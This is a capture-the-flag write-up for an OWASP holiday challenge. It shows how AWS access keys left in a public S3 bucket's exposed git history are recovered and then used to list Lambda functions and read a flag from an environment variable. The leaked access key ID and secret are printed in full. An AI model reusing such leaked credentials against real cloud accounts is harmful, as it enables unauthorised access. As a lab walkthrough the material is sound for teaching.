# Day 11

> The north pole set up a serverless system to help light up the Christmas tree. The correct passcode must be entered before the 25th. Otherwise, we will all be celebrating in darkness. Can you help find the passcode so everyone can celebrate the brightest Christmas ever?

http://y.owasp.si/

Similar to [Day 6](../06/README.md), we understand that website is powered by Amazon S3. We can copy all the `y.owasp.si` bucket contents to our computer:

```
$ aws s3 sync s3://y.owasp.si y.owasp.si
download: s3://y.owasp.si/.git/HEAD to y.owasp.si/.git/HEAD         
download: s3://y.owasp.si/.git/logs/HEAD to y.owasp.si/.git/logs/HEAD
download: s3://y.owasp.si/.git/objects/70/beacc058ec714edae2ab124d311725d96fed35 to y.owasp.si/.git/objects/70/beacc058ec714edae2ab124d311725d96fed35
download: s3://y.owasp.si/.git/hooks/pre-push.sample to y.owasp.si/.git/hooks/pre-push.sample
download: s3://y.owasp.si/.git/objects/4a/114e78dd9cf0264abf7c5ba1956cb8dcd73db7 to y.owasp.si/.git/objects/4a/114e78dd9cf0264abf7c5ba1956cb8dcd73db7
download: s3://y.owasp.si/.git/hooks/fsmonitor-watchman.sample to y.owasp.si/.git/hooks/fsmonitor-watchman.sample
download: s3://y.owasp.si/c1d4770507f608acacdefcafc5d3ee1f.py to y.owasp.si/c1d4770507f608acacdefcafc5d3ee1f.py
download: s3://y.owasp.si/.git/hooks/prepare-commit-msg.sample to y.owasp.si/.git/hooks/prepare-commit-msg.sample
download: s3://y.owasp.si/.git/logs/refs/heads/master to y.owasp.si/.git/logs/refs/heads/master
download: s3://y.owasp.si/.git/objects/5a/917e716c921688902aab10a380130b3710a25b to y.owasp.si/.git/objects/5a/917e716c921688902aab10a380130b3710a25b
download: s3://y.owasp.si/.git/hooks/pre-rebase.sample to y.owasp.si/.git/hooks/pre-rebase.sample
download: s3://y.owasp.si/.git/objects/09/2cbf9cb52b8037520a31ca9c4a32b4b867e07d to y.owasp.si/.git/objects/09/2cbf9cb52b8037520a31ca9c4a32b4b867e07d
download: s3://y.owasp.si/.git/objects/98/3437014b7bf1a2856b3c72c0f74cc7e3fb3221 to y.owasp.si/.git/objects/98/3437014b7bf1a2856b3c72c0f74cc7e3fb3221
download: s3://y.owasp.si/index.html to y.owasp.si/index.html     
download: s3://y.owasp.si/.git/hooks/pre-commit.sample to y.owasp.si/.git/hooks/pre-commit.sample
download: s3://y.owasp.si/.git/COMMIT_EDITMSG to y.owasp.si/.git/COMMIT_EDITMSG
download: s3://y.owasp.si/.git/hooks/pre-applypatch.sample to y.owasp.si/.git/hooks/pre-applypatch.sample
download: s3://y.owasp.si/.git/hooks/applypatch-msg.sample to y.owasp.si/.git/hooks/applypatch-msg.sample
download: s3://y.owasp.si/.git/index to y.owasp.si/.git/index     
download: s3://y.owasp.si/.git/objects/f2/1e05b0837f430149a17d3011bd67ba9c68f6a4 to y.owasp.si/.git/objects/f2/1e05b0837f430149a17d3011bd67ba9c68f6a4
download: s3://y.owasp.si/.git/hooks/pre-receive.sample to y.owasp.si/.git/hooks/pre-receive.sample
download: s3://y.owasp.si/.git/refs/heads/master to y.owasp.si/.git/refs/heads/master
download: s3://y.owasp.si/.git/objects/15/371e53631efc15fbd3631133d64e75f2ffeb8c to y.owasp.si/.git/objects/15/371e53631efc15fbd3631133d64e75f2ffeb8c
download: s3://y.owasp.si/.git/hooks/post-update.sample to y.owasp.si/.git/hooks/post-update.sample
download: s3://y.owasp.si/.git/objects/d5/d3e54e995947ce49d306d705fd6daf6eea2e32 to y.owasp.si/.git/objects/d5/d3e54e995947ce49d306d705fd6daf6eea2e32
download: s3://y.owasp.si/.git/info/exclude to y.owasp.si/.git/info/exclude
download: s3://y.owasp.si/.git/objects/ec/9189edf7d242f9b9a72db9956287c948af92f5 to y.owasp.si/.git/objects/ec/9189edf7d242f9b9a72db9956287c948af92f5
download: s3://y.owasp.si/.git/description to y.owasp.si/.git/description
download: s3://y.owasp.si/.git/objects/e1/e8181f1b55a7932e7c1108741414883b7414cf to y.owasp.si/.git/objects/e1/e8181f1b55a7932e7c1108741414883b7414cf
download: s3://y.owasp.si/.git/config to y.owasp.si/.git/config  
download: s3://y.owasp.si/.git/objects/e2/5e6531fa8ced789e08e00ed763350c411d3583 to y.owasp.si/.git/objects/e2/5e6531fa8ced789e08e00ed763350c411d3583
download: s3://y.owasp.si/.git/objects/3e/135dbe4b0eeab7aa7a9bc47c46375a920c5ce9 to y.owasp.si/.git/objects/3e/135dbe4b0eeab7aa7a9bc47c46375a920c5ce9
download: s3://y.owasp.si/.git/hooks/update.sample to y.owasp.si/.git/hooks/update.sample
download: s3://y.owasp.si/.git/hooks/commit-msg.sample to y.owasp.si/.git/hooks/commit-msg.sample
```

We have a git repository exposed here. So let's check out the history:

```
$ git log -p
-ACCESS_ID = 'AKIASBLP2FIFDVFADKB4'
-ACCESS_KEY = 'rQVJoWnbVXauzgIRQU3F3Ku1UfGfr0S8t3d+dhkG'
+ACCESS_ID = ''
+ACCESS_KEY = ''
```

Put it to `~/.aws/credentials` as some separate profile, let's say `y`:

```
[y]
aws_access_key_id = AKIASBLP2FIFDVFADKB4
aws_secret_access_key = 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
region = us-east-1
```

Then we can use them with aws-cli. The challenge description mentions "serverless" and we know that AWS has Lambda as a serverless platform. Enumerating all functions in all regions, we found one Lambda function. The flag is in its environment variable `flag`:

```
$ aws --profile y --region eu-west-1 lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "santas-function",
            "FunctionArn": "arn:aws:lambda:eu-west-1:140357806602:function:santas-function",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::140357806602:role/service-role/santas-function-role-ojk1ex97",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 343,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2020-12-01T19:54:26.847+0000",
            "CodeSha256": "Yjm3u4/IHHKG8/SpB4uHkutrjIpgOEVilfMsCKEG64o=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "flag": "xmas{around_th3_tree_w3_r0ck}"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "6998ae9f-412f-4b2a-8661-66a71ed77448",
            "PackageType": "Zip"
        }
    ]
}
